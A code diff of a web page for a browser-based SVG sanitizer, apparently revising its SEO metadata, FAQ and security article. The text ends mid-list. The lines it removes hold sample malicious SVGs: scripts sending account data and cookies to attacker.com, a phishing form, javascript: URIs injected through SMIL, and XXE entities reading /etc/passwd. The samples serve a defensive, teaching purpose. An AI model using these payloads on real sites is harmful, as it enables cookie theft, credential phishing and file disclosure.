@@ -2,27 +2,27 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   
-  <title>Offline SVG Sanitizer & XSS Defanger — Client-Side Security | BitDark</title>
-  <meta name="title" content="Offline SVG Sanitizer & XSS Defanger — Client-Side Security | BitDark" />
-  <meta name="description" content="Sanitize SVG vector graphics, strip inline scripts, event handlers, foreignObject injection, and external entity exploits locally in memory. Zero network egress." />
-  <meta name="keywords" content="svg sanitizer, defang svg xss, local svg cleaner, strip script from svg, client side svg parser, bitdark forensics, svg security audit, xml injection cleaner, foreignobject xss defense" />
+  <title>SVG Sanitizer — Free In-Browser SVG XSS Cleaner | BitDark</title>
+  <meta name="title" content="SVG Sanitizer — Free In-Browser SVG XSS Cleaner | BitDark" />
+  <meta name="description" content="Clean an SVG in your browser: remove script and foreignObject, on* event handlers, javascript:/data: URIs and DOCTYPE/ENTITY declarations, with an audit log. Nothing uploaded." />
+  <meta name="keywords" content="svg sanitizer, svg xss, clean svg, remove script from svg, svg security, foreignobject, sanitize svg online, svg sanitizer offline" />
   <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large" />
   <link rel="canonical" href="https://bitdark.net/tools/forensics/svg-sanitizer/" />
 
   <!-- Open Graph / Facebook -->
   <meta property="og:type" content="website" />
   <meta property="og:url" content="https://bitdark.net/tools/forensics/svg-sanitizer/" />
-  <meta property="og:title" content="Offline SVG Sanitizer & XSS Defanger — Client-Side Security | BitDark" />
-  <meta property="og:description" content="Sanitize SVG vectors, purge inline JavaScript, strip malicious event handlers, and neutralize XXE exploits in volatile browser memory with zero network egress." />
+  <meta property="og:title" content="SVG Sanitizer — In-Browser SVG XSS Cleaner | BitDark" />
+  <meta property="og:description" content="Strip scripts, event handlers and dangerous URIs from an SVG in your browser, with an audit log and a safe preview. Nothing uploaded." />
   <meta property="og:image" content="https://bitdark.net/assets/preview-banner.png" />
 
   <!-- Twitter / X -->
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:url" content="https://bitdark.net/tools/forensics/svg-sanitizer/" />
-  <meta name="twitter:title" content="Offline SVG Sanitizer & XSS Defanger | BitDark" />
-  <meta name="twitter:description" content="Defensive client-side SVG sanitizer and XSS defanger. Memory-only XML parsing with zero server egress." />
+  <meta name="twitter:title" content="SVG Sanitizer | BitDark" />
+  <meta name="twitter:description" content="Clean an SVG of scripts, event handlers and dangerous URIs in your browser. Nothing uploaded." />
 
   <!-- JSON-LD Structured Data: WebApplication, TechArticle, and FAQPage -->
   <script type="application/ld+json">
@@ -31,84 +31,64 @@
     "@graph": [
       {
         "@type": "WebApplication",
-        "name": "Offline SVG Sanitizer & XSS Defanger",
+        "name": "SVG Sanitizer",
         "url": "https://bitdark.net/tools/forensics/svg-sanitizer/",
         "applicationCategory": "SecurityApplication",
-        "operatingSystem": "All modern browsers (Offline-ready)",
-        "offers": {
-          "@type": "Offer",
-          "price": "0",
-          "priceCurrency": "USD"
-        },
-        "description": "Defensive client-side SVG sanitization and vector defanging utility that parses XML DOM trees, strips inline scripts, purges event listener attributes, eliminates foreignObject tags, and computes SHA-256 digests in volatile RAM."
+        "operatingSystem": "Any modern web browser",
+        "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" },
+        "description": "Browser-based SVG sanitizer that parses the file as an XML DOM and removes scripting vectors \u2014 script and foreignObject and similar elements, on* event handlers, javascript:/vbscript:/data: URIs and DOCTYPE/ENTITY declarations \u2014 then shows an audit log, a safe preview, a SHA-256 hash and a clean download."
       },
       {
         "@type": "TechArticle",
-        "headline": "Scalable Vector Graphics (SVG) Attack Vectors: XML DOM Execution, Cross-Site Scripting (XSS), and Memory-Safe Sanitization Architectures",
+        "headline": "Sanitizing SVG Files: Why SVG Can Carry XSS, What This Tool Removes, and Its Limits",
         "url": "https://bitdark.net/tools/forensics/svg-sanitizer/",
-        "author": {
-          "@type": "Organization",
-          "name": "BitDark.NET",
-          "url": "https://bitdark.net/"
-        },
-        "publisher": {
-          "@type": "Organization",
-          "name": "BitDark.NET",
-          "url": "https://bitdark.net/"
-        },
+        "author": { "@type": "Organization", "name": "BitDark.NET", "url": "https://bitdark.net/" },
+        "publisher": { "@type": "Organization", "name": "BitDark.NET", "url": "https://bitdark.net/" },
         "datePublished": "2024-05-12",
-        "dateModified": "2026-10-31",
-        "description": "Comprehensive engineering guide to SVG cross-site scripting vulnerabilities, namespace-evasion techniques, SMIL injection vectors, XML entity expansion exploits, and client-side DOM tree purification."
+        "dateModified": "2026-11-10",
+        "description": "Why an SVG is an executable XML document and not just an image, how this tool parses the DOM and strips scripting elements, event handlers and dangerous URIs, a reproducible example, and why an allowlist library is the stronger choice for production."
       },
       {
         "@type": "FAQPage",
         "mainEntity": [
           {
             "@type": "Question",
-            "name": "Why are SVG files uniquely vulnerable to Cross-Site Scripting (XSS) compared to PNG or JPEG images?",
+            "name": "Why can an SVG run JavaScript when a PNG or JPEG cannot?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "Unlike raster formats (PNG, JPEG, WebP) which consist of compressed pixel color arrays, SVG is an XML-based document standard standardized by the W3C. The SVG specification natively integrates the full DOM Level 2 and Level 3 event models, executable JavaScript (<script> tags), hyperlinking (<a> elements), HTML encapsulation (<foreignObject>), and declarative animations (SMIL). When rendered directly inside an HTML document or viewed in an active browsing context, an SVG executes arbitrary JavaScript in the user's origin."
+              "text": "A PNG or JPEG is just compressed pixels. An SVG is an XML document that the browser parses like a small web page: it can contain a script element, on* event handlers, links, embedded HTML via foreignObject, and SMIL animation. Rendered in an active context, that markup can run JavaScript, which is why an untrusted SVG needs cleaning or careful embedding."
             }
           },
           {
             "@type": "Question",
-            "name": "Does rendering an SVG inside an standard HTML <img> tag eliminate XSS risks?",
+            "name": "Does loading an SVG with an HTML img tag make it safe?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "Yes, standard modern web browsers execute SVG images loaded via <img> tags within a restricted 'image security mode'. In this mode, external resource requests, inline scripts, and interactive event handlers are blocked. However, if the file is served with the Content-Type header 'image/svg+xml' and visited directly by a user, embedded via <iframe>, <object>, or <embed>, or inlined directly into HTML via innerHTML or server-side includes, all embedded scripts execute with full origin permissions."
+              "text": "Largely, yes. Browsers render an SVG loaded through an <img> tag in a restricted mode where scripts and external loads do not run, which is also how this tool previews the cleaned file. The danger is the other ways an SVG is used: opened directly, embedded via <iframe>, <object> or <embed>, or inlined into a page with innerHTML \u2014 there its scripts can run. Sanitizing matters most when the SVG will be inlined."
             }
           },
           {
             "@type": "Question",
-            "name": "Why is regular expression (Regex) string replacement unsafe for sanitizing SVGs?",
+            "name": "What exactly does this tool remove?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "Regular expressions lack stateful awareness of nested XML structures, CDATA blocks, character encoding variations, HTML entity encodings, and XML namespace aliasing. Attackers easily bypass regex-based blocklists using obfuscation, such as mixing uppercase/lowercase characters, utilizing XML namespaces, splitting tag identifiers across CDATA markers, or leveraging browser-specific mutation XSS (mXSS) parsing differentials. Only structural XML DOM parsers can reliably evaluate the document tree."
+              "text": "It strips DOCTYPE and ENTITY declarations from the text, then parses the XML and removes known-dangerous elements (script, foreignObject, iframe, object, embed, style, form fields and others), every on* event-handler attribute, javascript:/vbscript:/data: URIs on href, src and SMIL animation values, and dangerous CSS in style attributes. Each removal is listed in the audit log."
             }
           },
           {
             "@type": "Question",
-            "name": "What is the security hazard of the SVG <foreignObject> element?",
+            "name": "Is this as thorough as DOMPurify?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "The <foreignObject> element allows authors to switch XML namespaces directly inside an SVG container and embed arbitrary XHTML, MathML, or HTML elements. Attackers utilize <foreignObject> to embed HTML <iframe>, <form>, <input>, and <img> elements with onerror payloads, completely circumventing simple vector filters that only scan for SVG-specific element names."
+              "text": "Not necessarily. This tool uses a denylist \u2014 it removes things known to be dangerous \u2014 which is good for triage and for seeing what a file contains, but a denylist can miss a novel or obfuscated vector. For production, a maintained allowlist sanitizer such as DOMPurify (which keeps only known-safe markup) is the stronger choice. Use this tool to inspect and clean, and defence-in-depth (CSP, serving from an isolated origin) alongside it."
             }
           },
           {
             "@type": "Question",
-            "name": "How does the BitDark SVG Sanitizer protect against XML External Entity (XXE) and Billion Laughs attacks?",
+            "name": "Is my SVG uploaded anywhere?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "Prior to DOM parsing, the BitDark engine strips all <!DOCTYPE ...> declarations and <!ENTITY ...> definitions from the raw text stream. This eliminates the parsing surface required for XML External Entity (XXE) attacks, local file disclosures, server-side request forgery (SSRF), and recursive entity expansion (Billion Laughs) denial-of-service memory exhausts."
-            }
-          },
-          {
-            "@type": "Question",
-            "name": "Are my proprietary SVG graphics or confidential illustrations uploaded to an external server?",
-            "acceptedAnswer": {
-              "@type": "Answer",
-              "text": "No. The BitDark platform operates on an absolute zero-network-egress model. All XML parsing, attribute scrubbing, SHA-256 digest calculation, and sanitized vector rendering occur locally within your browser's private WebAssembly and JavaScript memory space."
+              "text": "No. The file is read and parsed in your browser, the cleaning and the SHA-256 hash run there, and the preview is built from the cleaned file locally. Nothing you open is sent to a server; the page makes no network request for your file."
             }
           }
         ]
@@ -248,7 +228,7 @@
     .tool-header p { 
       color: var(--atom-text); 
       font-size: 1.05rem; 
-      max-width: 950px;
+      max-width: 1200px;
       line-height: 1.6;
     }
 
@@ -777,7 +757,7 @@
 
     <div class="tool-header">
       <h1>SVG Sanitizer & XSS Defanger</h1>
-      <p>Clean malicious vectors, inline script tags, recursive entity injections, foreignObject framing, and event handlers locally in browser memory. Air-gapped XML tree inspection with zero network egress.</p>
+      <p>Clean an untrusted SVG in your browser: it parses the XML and removes scripts, <code>foreignObject</code>, <code>on*</code> event handlers, <code>javascript:</code>/<code>data:</code> URIs and DOCTYPE/ENTITY declarations, listing each change in an audit log. Everything runs locally and nothing you open is uploaded.</p>
     </div>
 
     <!-- AdSense Safe Placement Slot #1 (Zero CLS: Hidden until script loads & fills) -->
@@ -837,481 +817,137 @@
       </div>
     </section>
 
-    <!-- Authoritative Operational Boundaries & Legal Disclaimer -->
+
+    <!-- Limitations & Disclaimer -->
     <aside class="disclaimer-card">
       <div class="disclaimer-header">
-        <span>⚠️</span> Forensic Boundaries & Legal Disclaimer
+        <span>&#9888;&#65039;</span> Limitations &amp; Disclaimer
       </div>
       <p>
-        <strong>BitDark.net is not responsible for any direct, indirect, incidental, or consequential damages, misattributions, legal liabilities, or forensic errors arising from the use or interpretation of data provided by this tool. Client-side heuristic scanners cannot replace hardware trust chains or formal chain-of-custody verification.</strong>
-      </p>
-      <p style="margin-top: 10px;">
-        This client-side utility executes deterministic, rule-based XML DOM element stripping and attribute purification in your browser's private JavaScript runtime. Because SVG specifications are extraordinarily vast, rendering implementations differ between browser engines (WebKit, Blink, Gecko), and complex polyglots or zero-day mutation XSS (mXSS) vectors can exploit HTML parser quirks. Always enforce secondary defensive layers—such as serving untrusted vector assets from isolated sandboxed subdomains with strict <code>Content-Security-Policy: default-src 'none'</code> headers and <code>Content-Disposition: attachment</code>—prior to serving user-supplied vectors to downstream applications.
+        <strong>This is a denylist sanitizer for triage and convenience, not a guarantee.</strong> It parses the SVG as an XML DOM and removes elements, event handlers and URIs known to be dangerous, and lists each change in an audit log. Because it removes what it knows to be bad rather than keeping only what is known to be safe, a novel, obfuscated or browser-specific (mXSS) vector could slip through. For anything you will serve to other users, prefer a maintained allowlist library such as DOMPurify and add defence-in-depth &mdash; a strict <code>Content-Security-Policy</code>, serving untrusted vectors from an isolated origin with <code>Content-Disposition: attachment</code>. Everything runs in your browser and nothing you open is uploaded. Results are provided as-is; BitDark.net is not liable for decisions made from them.
       </p>
     </aside>
 
-    <!-- Comprehensive Technical Authority Article (2500+ Words) -->
+    <!-- Technical Article -->
     <article class="article-container">
-      <h2>Understanding SVG Security Architecture: XML-DOM Executability and Vector Risks</h2>
+      <h2>Why an SVG Is Not Just an Image</h2>
       <p>
-        Scalable Vector Graphics (SVG) occupies a unique and dangerous position in the modern web ecosystem. To developers, designers, and webmasters, an SVG file is often conceptualized as simply another image asset—a vector cousin to JPEG, PNG, or WebP. Security architectures and content upload pipelines frequently treat <code>.svg</code> files as benign graphic buffers, applying basic file size checks or MIME-type validation before storing them on CDNs or displaying them in user profiles.
-      </p>
-      <p>
-        This mental model represents a severe structural misunderstanding of the format. <strong>An SVG file is not a raster image buffer; it is a full, Turing-complete XML document.</strong> Standardized by the World Wide Web Consortium (W3C), the SVG standard was explicitly engineered to integrate seamlessly with the HTML DOM, CSS styling cascades, JavaScript scripting engines, and declarative multimedia animation protocols. 
-      </p>
-      <p>
-        Consequently, an SVG file possesses the full computational capabilities of a standard web page. It can instantiate scripts, declare asynchronous network fetch requests, read and exfiltrate browser cookies, interact with <code>localStorage</code>, manipulate the browser DOM, access WebRTC peripherals, and execute sophisticated phishing overlays. When an application allows users to upload untrusted SVGs and serves them without rigorous sanitization or isolation, it is effectively granting arbitrary third parties the ability to execute untrusted JavaScript directly within the application's security origin.
+        A PNG or JPEG is a block of compressed pixels &mdash; there is nothing in it to execute. An <strong>SVG is different</strong>: it is an XML document that the browser parses much like a small web page. The SVG standard allows a <code>&lt;script&gt;</code> element, <code>on*</code> event handlers such as <code>onload</code> and <code>onerror</code>, hyperlinks, embedded HTML through <code>&lt;foreignObject&gt;</code>, and SMIL animation. When an SVG is rendered in an active context &mdash; opened directly, inlined into a page, or embedded with <code>&lt;iframe&gt;</code>/<code>&lt;object&gt;</code> &mdash; that markup can run JavaScript in the page's origin. That is the cross-site-scripting (XSS) risk a user-uploaded SVG carries, and why it should be cleaned before being trusted.
       </p>
 
-      <h2>How to Use the BitDark Offline SVG Sanitizer & Defanger</h2>
+      <h2>What This Tool Does</h2>
       <p>
-        The BitDark SVG Sanitizer operates strictly in volatile client memory without transmitting a single byte of your artwork or proprietary vectors across the network. The workflow is streamlined for both automated security audits and rapid manual triage:
+        Drop in an SVG and the tool cleans it in your browser and shows you exactly what it changed. It works on the document structure, not by blind text search:
       </p>
       <ol>
-        <li>
-          <strong>Load Target Vector File:</strong> Drag and drop your untrusted <code>.svg</code> file onto the interactive dropzone, or click the dropzone to browse your local filesystem.
-        </li>
-        <li>
-          <strong>Pre-Parsing Memory Triage:</strong> The engine immediately inspects the raw text stream. Before instantiating the browser's DOM parser, it evaluates and scrubs Document Type Definitions (<code>&lt;!DOCTYPE&gt;</code>) and entity declarations (<code>&lt;!ENTITY&gt;</code>) to prevent XML External Entity (XXE) memory exhaustion attacks.
-        </li>
-        <li>
-          <strong>Isolated XML DOM Traversal:</strong> The sanitized XML string is passed into the native browser <code>DOMParser</code> instantiated strictly within an <code>image/svg+xml</code> context. The tree walker performs recursive node inspection, matching tag names and attributes against defensive security specifications.
-        </li>
-        <li>
-          <strong>Audit & Neutralization Log:</strong> The interface displays a comprehensive audit trail of every neutralized element, removed event listener, and sanitized executable URI scheme, alongside original and cleaned file metrics.
-        </li>
-        <li>
-          <strong>Cryptographic Checksum & Verification:</strong> The engine calculates a hardware-accelerated SHA-256 digest of the purified vector buffer using the W3C Web Cryptography API (<code>SubtleCrypto</code>).
-        </li>
-        <li>
-          <strong>Safe Sandboxed Preview & Export:</strong> The purified vector is rendered inside an isolated <code>&lt;img&gt;</code> container using an in-memory <code>Blob</code> Object URL (where script execution is strictly disabled by browser security policies). Click "Download Sanitized SVG" to export the purified vector directly to your disk.
-        </li>
+        <li>It first strips <code>&lt;!DOCTYPE&gt;</code> and <code>&lt;!ENTITY&gt;</code> declarations from the text, which removes the surface for XML-entity attacks before parsing.</li>
+        <li>It parses the file into an XML DOM and confirms the root really is an <code>&lt;svg&gt;</code>.</li>
+        <li>It removes known-dangerous elements &mdash; <code>script</code>, <code>foreignObject</code>, <code>iframe</code>, <code>object</code>, <code>embed</code>, <code>style</code>, form controls and others &mdash; matching on the local element name so a namespace trick cannot hide them.</li>
+        <li>It strips every <code>on*</code> event-handler attribute, and <code>javascript:</code>, <code>vbscript:</code> or <code>data:</code> URIs on <code>href</code>, <code>src</code> and SMIL animation values, plus dangerous CSS in <code>style</code> attributes.</li>
+      </ol>
+      <p>
+        Every removal is written to an audit log, and the result is shown three ways: the cleaned source, a SHA-256 hash of it, and a preview rendered through an <code>&lt;img&gt;</code> tag &mdash; the browser's own restricted mode, so nothing in the file runs while you look at it. You can download the cleaned SVG.
+      </p>
+
+      <h2>Why Structure, Not Regex</h2>
+      <p>
+        Searching for <code>&lt;script&gt;</code> with a regular expression is easy to evade: mixed case, split tokens, CDATA sections, entity encodings and namespace aliases all defeat simple text matching. Parsing into a DOM and inspecting real elements and attributes is far more reliable, which is the approach here. The one text-level step is removing <code>DOCTYPE</code>/<code>ENTITY</code> before parsing, which is a deliberate pre-pass to take entity-expansion tricks off the table.
+      </p>
+
+      <h2>A Worked Example You Can Reproduce</h2>
+      <p>
+        Save this hostile SVG as <code>test.svg</code> &mdash; it tries to run script three different ways:
+      </p>
+      <pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"&gt;
+  &lt;script&gt;alert(document.domain)&lt;/script&gt;
+  &lt;a href="javascript:alert(2)"&gt;&lt;text y="20"&gt;click&lt;/text&gt;&lt;/a&gt;
+&lt;/svg&gt;</code></pre>
+      <p>
+        Drop it in and the audit log reports three removals: the <code>&lt;script&gt;</code> element stripped, the <code>onload</code> handler stripped from <code>&lt;svg&gt;</code>, and the <code>javascript:</code> URI stripped from the <code>&lt;a&gt;</code>. The cleaned output is a plain <code>&lt;svg&gt;</code> with the harmless <code>&lt;text&gt;</code> left intact, the preview renders it safely, and the threat count reads 3. Change the payloads and watch the log update &mdash; it is a good way to see which constructs the tool recognises.
+      </p>
+
+      <h2>How to Use the Tool</h2>
+      <ol>
+        <li><strong>Open an SVG</strong> &mdash; drag it onto the dropzone, or click to browse.</li>
+        <li><strong>Read the audit log</strong> &mdash; it lists every element, handler and URI removed, with a threat count.</li>
+        <li><strong>Check the preview and source</strong> &mdash; the safe preview and the cleaned markup, with a SHA-256 of the result.</li>
+        <li><strong>Download</strong> the cleaned SVG, or reset to clean another.</li>
       </ol>
 
-      <h2>When to Use This Tool: Threat Modeling, Workflows & Operational Scenarios</h2>
-      <p>
-        Vector sanitization is mandatory across defensive security engineering, software development life cycles, and digital forensic pipelines:
-      </p>
+      <h2>Limits Worth Knowing</h2>
       <ul>
-        <li>
-          <strong>User Avatar & Profile Media Ingestion:</strong> Social networks, enterprise SaaS applications, and community platforms that permit vector avatars must sanitize uploaded graphics to prevent Stored Cross-Site Scripting (XSS) attacks targeting other authenticated users.
-        </li>
-        <li>
-          <strong>CMS & E-Commerce Asset Verification:</strong> Content management systems (WordPress, Drupal, Shopify) where content creators upload logos, banners, and product badges require pre-flight sanitization to prevent administrative session hijacking.
-        </li>
-        <li>
-          <strong>Digital Forensics & Malware Triage:</strong> Incident response analysts evaluating suspicious phishing attachments, malicious billing invoices disguised as SVG documents, or weaponized icons can safely dissect and neutralize payloads without detonating code on their workstations.
-        </li>
-        <li>
-          <strong>CI/CD Build Pipeline Hardening:</strong> Front-end development teams ingesting third-party vector icon sets (such as open-source icon libraries) can audit assets locally before checking them into version control repositories.
-        </li>
-        <li>
-          <strong>Zero-Trust Technical Document Sanitization:</strong> Technical illustrators exporting vector diagrams from CAD software or open-source tools (such as Inkscape or Adobe Illustrator) can scrub unwanted metadata, local path leaks, and nested script hooks prior to public distribution.
-        </li>
-      </ul>
-
-      <h2>The Anatomy of Malicious SVG Exploits</h2>
-      <p>
-        To defend against malicious vectors, security professionals must understand the diverse attack surfaces defined within the W3C SVG specifications.
-      </p>
-
-      <h3>1. Direct Executable Elements: The <code>&lt;script&gt;</code> Vector</h3>
-      <p>
-        The most rudimentary yet catastrophic SVG vulnerability is the direct inclusion of the <code>&lt;script&gt;</code> tag. When an SVG is served with the MIME type <code>image/svg+xml</code> and viewed directly in a browser, or embedded via an <code>&lt;iframe&gt;</code> or <code>&lt;object&gt;</code>, the script tag executes immediately:
-      </p>
-      <pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"&gt;
-  &lt;circle cx="50" cy="50" r="40" fill="red" /&gt;
-  &lt;script type="text/javascript"&gt;
-    fetch('/api/account/export', {credentials: 'include'})
-      .then(r =&gt; r.text())
-      .then(data =&gt; {
-        new Image().src = 'https://attacker.com/steal?data=' + encodeURIComponent(data);
-      });
-  &lt;/script&gt;
-&lt;/svg&gt;</code></pre>
-
-      <h3>2. Event Handler Attributes (Inline Listeners)</h3>
-      <p>
-        SVGs inherit the standard DOM event model. Attackers can bind JavaScript execution to dozens of intrinsic event attributes across almost any SVG element (<code>&lt;svg&gt;</code>, <code>&lt;rect&gt;</code>, <code>&lt;circle&gt;</code>, <code>&lt;path&gt;</code>, <code>&lt;image&gt;</code>):
-      </p>
-      <ul>
-        <li><code>onload</code>: Triggers automatically the instant the vector element is parsed and drawn.</li>
-        <li><code>onerror</code>: Frequently placed on <code>&lt;image&gt;</code> tags referencing a non-existent asset to force instantaneous execution.</li>
-        <li><code>onmouseover</code>, <code>onclick</code>, <code>onfocusin</code>: Interactive triggers that execute when users move their pointer over an element.</li>
-        <li><code>onbegin</code>, <code>onend</code>, <code>onrepeat</code>: Animation lifecycle triggers integrated into Synchronized Multimedia Integration Language (SMIL) elements.</li>
-      </ul>
-
-      <h3>3. The <code>&lt;foreignObject&gt;</code> Container Escape</h3>
-      <p>
-        One of the most dangerous features of the SVG standard is the <code>&lt;foreignObject&gt;</code> element. It allows an author to embed external XML namespaces—most notably standard XHTML—directly inside an SVG tree:
-      </p>
-      <pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg" width="400" height="300"&gt;
-  &lt;foreignObject width="100%" height="100%"&gt;
-    &lt;div xmlns="http://www.w3.org/1999/xhtml"&gt;
-      &lt;iframe src="javascript:alert(document.domain)"&gt;&lt;/iframe&gt;
-      &lt;form action="https://attacker.com/phish" method="POST"&gt;
-        &lt;input type="password" name="pwd" placeholder="Enter Master Password" /&gt;
-        &lt;button type="submit"&gt;Unlock Document&lt;/button&gt;
-      &lt;/form&gt;
-    &lt;/div&gt;
-  &lt;/foreignObject&gt;
-&lt;/svg&gt;</code></pre>
-      <p>
-        Attackers leverage <code>&lt;foreignObject&gt;</code> to bypass naive security filters that look only for SVG elements. Inside <code>&lt;foreignObject&gt;</code>, an adversary can instantiate HTML forms, iframes, audio/video elements with embedded malicious streams, or active UI redressing overlays.
-      </p>
-
-      <h3>4. SMIL Animation Manipulation and Dynamic Attribute Injection</h3>
-      <p>
-        Synchronized Multimedia Integration Language (SMIL) provides declarative animation primitives inside SVG, including <code>&lt;animate&gt;</code>, <code>&lt;set&gt;</code>, <code>&lt;animateTransform&gt;</code>, and <code>&lt;animateMotion&gt;</code>. Malicious actors utilize SMIL to dynamically manipulate attributes at runtime, rewriting innocent attributes into executable JavaScript payloads:
-      </p>
-      <pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
-  &lt;a id="targetLink"&gt;
-    &lt;text y="20"&gt;Click to Download Report&lt;/text&gt;
-  &lt;/a&gt;
-  &lt;animate xlink:href="#targetLink" attributeName="href"
-           from="https://legitimate.org"
-           to="javascript:alert(document.cookie)"
-           dur="0.1s" fill="freeze" begin="0s" /&gt;
-&lt;/svg&gt;</code></pre>
-
-      <h3>5. Executable Pseudo-Protocols in Hyperlinks and References</h3>
-      <p>
-        Just like HTML anchors, SVG hyperlinks (<code>&lt;a&gt;</code>) and resource references (such as <code>&lt;use&gt;</code>, <code>&lt;image&gt;</code>, and <code>&lt;feImage&gt;</code>) support both standard and namespaced <code>href</code> attributes (e.g., <code>xlink:href</code>). Attackers utilize executable pseudo-protocols:
-      </p>
-      <ul>
-        <li><code>javascript:...</code>: Executes code directly upon user click or SVG initialization.</li>
-        <li><code>data:text/html;base64,...</code>: Navigates or references an encoded HTML payload that executes scripts in an isolated origin or triggers downloads.</li>
-        <li><code>vbscript:...</code>: Legacy execution vector that affects older rendering engines or embedded WebView environments.</li>
-      </ul>
-
-      <h3>6. XML External Entity (XXE) and Billion Laughs DOS Attacks</h3>
-      <p>
-        Because SVG is parsed by underlying XML processors, it is inherently susceptible to document type attacks:
-      </p>
-      <ul>
-        <li><strong>Billion Laughs (Recursive Entity Expansion):</strong> Attackers define nested internal XML entities where entity 10 references entity 9 ten times, entity 9 references entity 8 ten times, and so forth. Expanding the tree consumes gigabytes of memory within milliseconds, crashing browser tabs or freezing server-side renderers.</li>
-        <li><strong>XML External Entity (XXE) Ingestion:</strong> Defining external system entities (e.g., <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code>) enables attackers to extract local server secrets or initiate Server-Side Request Forgery (SSRF) when the SVG is handled by server-side libraries (like ImageMagick, Batik, or Cairo).</li>
-      </ul>
-
-      <h2>Worked Examples: Step-by-Step Payload Neutralization</h2>
-      <p>
-        To observe the BitDark sanitizer engine in action, consider the following weaponized SVG containing four simultaneous exploit vectors: an external entity declaration, an inline <code>&lt;script&gt;</code> tag, a malicious <code>onload</code> event attribute, and an XHTML <code>&lt;foreignObject&gt;</code> container.
-      </p>
-
-      <h3>The Input Payload (Weaponized Vector)</h3>
-      <pre><code>&lt;?xml version="1.0" standalone="no"?&gt;
-&lt;!DOCTYPE svg [
-  &lt;!ENTITY % file SYSTEM "file:///etc/hosts"&gt;
-  %file;
-]&gt;
-&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="300" onload="alert('XSS Root')"&gt;
-  &lt;circle cx="150" cy="150" r="100" fill="#e06c75" onclick="javascript:stealTokens()" /&gt;
-  &lt;script type="text/javascript"&gt;
-    /* Injected Beacon */
-    window.location='https://attacker.com/cookie?c='+document.cookie;
-  &lt;/script&gt;
-  &lt;a xlink:href="javascript:eval(atob('ZG9jdW1lbnQud3JpdGUoJ1hTUycp'))"&gt;
-    &lt;text x="50" y="50" fill="#000"&gt;Click Me&lt;/text&gt;
-  &lt;/a&gt;
-  &lt;foreignObject width="100" height="50"&gt;
-    &lt;body xmlns="http://www.w3.org/1999/xhtml"&gt;
-      &lt;iframe src="javascript:alert('Iframe XSS')"&gt;&lt;/iframe&gt;
-    &lt;/body&gt;
-  &lt;/foreignObject&gt;
-&lt;/svg&gt;</code></pre>
-
-      <h3>The Sanitization Execution Trace</h3>
-      <p>
-        When ingested, the BitDark engine executes its defensive sequence:
-      </p>
-      <div class="tech-table-wrapper">
-        <table class="tech-table">
-          <thead>
-            <tr>
-              <th>Target Component</th>
-              <th>Attack Vector Identified</th>
-              <th>Remediation Action</th>
-              <th>Post-Clean State</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td><code>&lt;!DOCTYPE svg [...]&gt;</code></td>
-              <td>XML External Entity (XXE) Injection</td>
-              <td><strong>Pre-clean Regex Purge:</strong> Stripped before parsing</td>
-              <td>Completely removed from document stream</td>
-            </tr>
-            <tr>
-              <td><code>onload="alert(...)"</code></td>
-              <td>Intrinsic Document Event Execution</td>
-              <td><strong>Attribute Purge:</strong> Evaluated and deleted from root</td>
-              <td>Root <code>&lt;svg&gt;</code> retains geometry, attributes stripped</td>
-            </tr>
-            <tr>
-              <td><code>&lt;script&gt;</code> Element</td>
-              <td>Direct JavaScript Execution Block</td>
-              <td><strong>Node Removal:</strong> Matching localName <code>script</code></td>
-              <td>Entire DOM node and text children purged</td>
-            </tr>
-            <tr>
-              <td><code>onclick="..."</code> on <code>&lt;circle&gt;</code></td>
-              <td>Inline Event Listener Trigger</td>
-              <td><strong>Attribute Purge:</strong> Node listener purged</td>
-              <td>Circle retains <code>cx</code>, <code>cy</code>, <code>r</code>, <code>fill</code></td>
-            </tr>
-            <tr>
-              <td><code>xlink:href="javascript:..."</code></td>
-              <td>Executable URI Scheme Pseudo-Protocol</td>
-              <td><strong>Namespace Attribute Scrubbing:</strong> Disallowed scheme</td>
-              <td><code>xlink:href</code> removed from <code>&lt;a&gt;</code> element</td>
-            </tr>
-            <tr>
-              <td><code>&lt;foreignObject&gt;</code> Element</td>
-              <td>HTML Namespace Escape Container</td>
-              <td><strong>Node Removal:</strong> Matching localName <code>foreignobject</code></td>
-              <td>Container and embedded iframe purged</td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-
-      <h3>The Purified Output Buffer</h3>
-      <pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="300"&gt;
-  &lt;circle cx="150" cy="150" r="100" fill="#e06c75"&gt;&lt;/circle&gt;
-  &lt;a&gt;
-    &lt;text x="50" y="50" fill="#000"&gt;Click Me&lt;/text&gt;
-  &lt;/a&gt;
-&lt;/svg&gt;</code></pre>
-      <p>
-        The visual geometric components of the graphic are preserved with mathematical precision. All executable scripts, interactive listeners, external entity hooks, and container escapes have been permanently eliminated.
-      </p>
-
-      <h2>Parser Mismatch & DOM Clobbering: Why Regex Cleaning Fails</h2>
-      <p>
-        One of the most widespread security anti-patterns in web development is attempting to sanitize SVG files using regular expression string replacements (e.g., <code>content.replace(/&lt;script[\s\S]*?&gt;[\s\S]*?&lt;\/script&gt;/gi, '')</code>).
-      </p>
-      <p>
-        In application security engineering, <strong>regex-based HTML/XML parsing is considered fatally flawed</strong> due to fundamental grammar limitations:
-      </p>
-      <ul>
-        <li>
